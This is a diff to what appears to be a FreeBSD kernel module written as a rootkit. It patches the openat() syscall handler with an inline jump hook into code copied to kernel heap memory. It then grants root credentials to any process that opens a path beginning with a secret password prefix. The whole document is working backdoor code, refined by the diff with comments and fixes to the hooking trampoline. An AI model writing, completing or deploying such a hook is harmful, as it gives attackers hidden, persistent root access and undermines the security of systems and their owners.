@@ -8,26 +8,25 @@
 #include <sys/sysent.h>
 #include <sys/types.h>
 #include <sys/malloc.h>
-// #include <sys/param.h>
-// #include <vm/vm.h>
-// #include <vm/vm_param.h>
-// #include <vm/pmap.h>
-// #include <vm/vm_map.h>
-// #include <vm/vm_extern.h>
 
+// dummy noinline function to prevent some code from being
+// optimized out by the compiler.
 static int
-__attribute__ ((noinline)) dummyret(struct thread *td) {
-    return (td == (void *) NULL) ? 1 : 0;
+__attribute__ ((noinline)) dummyret(struct thread *td, void *syscall_args) {
+    return (td == (void *) NULL && syscall_args == (void *) NULL) ? 1 : 0;
 }
 
+// grabs the program counter and places it in ecx.
 static void
 __attribute__ ((noinline)) get_pc_ecx() {
     __asm__ volatile ("mov 4(%esp), %ecx");
 }
 
+// syscall hook.
 static int
 new_sy_call(struct thread *td, void *syscall_args) {
 
+    // arguments of the openat() syscall.
     struct sc_args {
         int fd;
         char *path;
@@ -35,72 +34,97 @@ new_sy_call(struct thread *td, void *syscall_args) {
         mode_t mode;
     };
 
-    get_pc_ecx();
-    __asm__ volatile ("addl $50, %ecx"); // TODO get exact value to add
-    __asm__ volatile ("push %ecx"); // push return address (old_sy_call's return addr)
+    // dummyret() down below causes the compiler to move td and
+    // syscall_args to registers esi and edi.
 
+    // push the args of old_sy_call on the stack.
+    __asm__ volatile ("push %edi");
+    __asm__ volatile ("push %esi");
+
+    // push old_sy_call's return address.
+    get_pc_ecx(); // get program counter and place into ecx.
+    __asm__ volatile ("addl $50, %ecx"); // make ecx point to the nop sled below.
+    __asm__ volatile ("push %ecx"); // push ecx as old_sy_call's return address.
+
+    // execute the instruction bytes of old_sy_call that were overwritten when
+    // we overwrote the old_sy_call's first few bytes to jmp to this function.
     __asm__ volatile ("push %ebp");
     __asm__ volatile ("mov  %esp, %ebp");
     __asm__ volatile ("push %edi");
     __asm__ volatile ("push %esi");
 
-    // the following trick jmps to old_sy_call + 5
-    // old_sy_call: 0xc0c42820
-    __asm__ volatile ("movl 0xc0c42825, %ecx");
+    // the following trick jmps to old_sy_call+5 (old_sy_call: 0xc0c42820).
+    // this achieves an absolute jmp.
+    __asm__ volatile ("movl $0xc0c42825, %ecx");
     __asm__ volatile ("push %ecx");
-    int retval = dummyret(td); // to prevent the rest from being optimized out
+    // dummyret() prevents code below from being optimized out by the compiler.
+    int retval = dummyret(td, syscall_args);
+    // expression is always true so jmp-ret trick is always performed.
     if (retval == 0) {
         __asm__ volatile ("ret");
     }
 
-    // TODO insert jmp to old syscall + 5,
-    // when old sys call returns, its retval will be in eax.
+    // nop sled where old_sy_call will return to.
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
 
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
+    // pop off old_sy_call's arguments
+    __asm__ volatile ("pop %esi");
+    __asm__ volatile ("pop %edi");
 
-    if (retval != 0) {                                                        
+    // if the syscall's return value is not 0,
+    // then just return because the arguments may not point
+    // to a valid page/may not be mapped.
+    if (retval != 0) {
         goto returnlabel;
-    }                                                                         
+    }
 
-    struct sc_args *args = (struct sc_args *) syscall_args;                   
-    char *str = args->path;                                                  
+    struct sc_args *args = (struct sc_args *) syscall_args;
+    char *str = args->path;
 
-    if (str[0] == '*' &&                                                      
-        str[1] == '3' &&                                                      
-        str[2] == 'f' &&                                                      
-        str[3] == '5' &&                                                      
-        str[4] == 'b' &&                                                      
-        str[5] == '1') {                                                      
+    // check if the string argument to openat() contains the password prefix.
+    if (str[0] == '*' &&
+        str[1] == '3' &&
+        str[2] == 'f' &&
+        str[3] == '5' &&
+        str[4] == 'b' &&
+        str[5] == '1') {
 
+        // escalate the thread to root.
         td->td_ucred->cr_uid =
             td->td_ucred->cr_ruid =
             td->td_ucred->cr_svuid =
@@ -111,9 +135,10 @@ new_sy_call(struct thread *td, void *syscall_args) {
     }
 
 returnlabel:
-    return (retval);                                                          
+    return (retval);
 }
 
+// places the bytes of addr into the bytes array in little endian order.
 static void
 p32(uint8_t bytes[], void *addr) {
 
@@ -124,6 +149,8 @@ p32(uint8_t bytes[], void *addr) {
     bytes[3] = (addr32 >> 24) & 0xff;
 }
 
+// crafts a relative jmp instruction that jmps from src to dest address.
+// the jmp instruction is placed into the bytes array.
 static void
 craft_jmphook(uint8_t jmphook[], void *src, void *dest) {
 
@@ -134,10 +161,11 @@ craft_jmphook(uint8_t jmphook[], void *src, void *dest) {
     p32(&(jmphook[1]), (void *) ((char *)dest - (char *)src - 5));
 }
 
+// writes the jmphook contained in the bytes array to the target address.
 static void
-overwrite_jmphook(uint8_t jmphook[], void *void_addr) {
+overwrite_jmphook(uint8_t jmphook[], void *target_addr) {
 
-    char *addr = (char *)void_addr;
+    char *addr = (char *)target_addr;
     addr[0] = jmphook[0];
     addr[1] = jmphook[1];
     addr[2] = jmphook[2];
@@ -145,36 +173,40 @@ overwrite_jmphook(uint8_t jmphook[], void *void_addr) {
     addr[4] = jmphook[4];
 }
 
+// function that is called when the module is loaded and unloaded.
 static int
 load(struct module *module, int cmd, void *arg) {
 
     switch (cmd) {
     case MOD_LOAD: {
+        // the following is executed during module load.
 
+        // function pointer to the old syscall implementation of openat() syscall.
+        // we use a char * for the sake of pointer arithmetic convenience later on.
         char *old_sy_call = (char *)sysent[SYS_openat].sy_call;
-        char *malloc_addr = malloc(1024ul, M_TEMP, M_NOWAIT | M_USE_RESERVE);
+
+        // malloc must not cause this process to be to put to sleep (NO_WAIT),
+        // so it must use system reserve (so that the request can be satisfied
+        // without this process being put to sleep).
+        // the malloc region surprisingly has execute permissions.
+        char *malloc_addr = malloc(256ul, M_TEMP, M_NOWAIT | M_USE_RESERVE);
 
         uint8_t jmphook[5];
         craft_jmphook(jmphook, old_sy_call, malloc_addr);
         overwrite_jmphook(jmphook, old_sy_call);
 
-        // copy the instruction bytes in new_sy_call to the malloc region
+        // copy the instruction bytes in new_sy_call (the hook) to the malloc region.
         char *new_sy_call_addr = (char *)new_sy_call;
-        for (unsigned int i = 0; i < 300; i++) {
+        for (unsigned int i = 0; i < 256; i++) {
 
-            // if we hit a page boundary break out because
-            // the permissions may not be the same
+            // if we hit a page boundary, break out because
+            // the permissions may not be the same across different pages.
             if ((unsigned int)(new_sy_call_addr + i) % PAGE_SIZE == 0) {
                 break;
             }
 
             malloc_addr[i] = new_sy_call_addr[i];
         }
-
-        printf("\njmp hook instr bytes: %x %x %x %x %x\n", jmphook[0], jmphook[1], jmphook[2], jmphook[3], jmphook[4]);
-        printf("old_sy_call: %p\n", old_sy_call);
-        printf("new_sy_call: %p\n", new_sy_call);
-        printf("malloc: %p\n", malloc_addr);
 
         break;
     }
